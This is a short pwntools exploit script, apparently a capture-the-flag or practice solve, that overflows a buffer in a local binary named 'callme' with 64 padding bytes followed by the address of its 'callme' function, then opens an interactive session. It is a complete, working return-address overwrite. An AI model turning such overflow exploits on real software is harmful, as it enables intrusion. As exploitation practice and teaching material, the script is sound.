from pwn import *
exe = './callme'
p = process(exe)
elf = ELF(exe)
context.log_level = 'DEBUG'
padding = 64
# payload = (
#     b'A' * padding,
#     p64(0x44434241)
# )
payload = b'A' * padding + p64(elf.sym.callme)
p.recvuntil(b'out:')
p.sendline(payload)
p.interactive()